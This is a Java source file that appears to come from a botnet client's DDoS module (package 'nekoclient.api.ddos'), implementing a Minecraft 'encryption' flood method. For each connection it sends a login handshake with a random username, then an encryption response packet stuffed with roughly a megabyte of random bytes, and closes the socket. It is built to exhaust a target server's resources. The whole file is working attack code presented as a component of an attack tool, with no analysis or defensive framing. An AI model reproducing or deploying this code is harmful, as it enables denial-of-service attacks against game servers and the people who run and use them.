package dev.neko.nekoclient.api.ddos.impl.handler.impl.minecraft;

import com.eclipsesource.json.JsonObject;
import dev.neko.nekoclient.api.ddos.Protocol;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.MinecraftMethodHandler;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.State;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.type.Type;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.type.impl.BytesType;
import java.io.IOException;
import java.math.BigInteger;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.security.SecureRandom;
import java.util.Objects;
import java.util.UUID;

public class MinecraftEncryptionMethod extends MinecraftMethodHandler {
   private boolean waitForRequest;
   private ByteBuffer handshakePacket;
   private ByteBuffer encryptionResponsePacket;
   private final SecureRandom random = new SecureRandom();

   @Override
   public void init(Protocol protocol, InetSocketAddress address, String host, JsonObject options) throws IllegalArgumentException {
      super.init(protocol, address, host, options);
      this.waitForRequest = options.getBoolean("waitForRequest", false);
      this.handshakePacket = this.createHandshakePacket(this.protocolVersion, this.host, this.port, State.LOGIN);
      byte[] bytes = new byte[1048560];
      this.random.nextBytes(bytes);
      this.encryptionResponsePacket = this.createPacket(1, new Type[]{new BytesType(bytes), new BytesType(bytes)});
   }

   @Override
   public void handle(SocketChannel channel) throws IOException {
      channel.write(this.handshakePacket.duplicate());
      channel.write(this.createLoginStartPacket(new BigInteger(64, this.random).toString(16), UUID.randomUUID()));
      if (!this.waitForRequest || Objects.equals(this.readPacket(channel).getId(), 1)) {
         channel.write(this.encryptionResponsePacket.duplicate());
      }

      channel.close();
   }
}
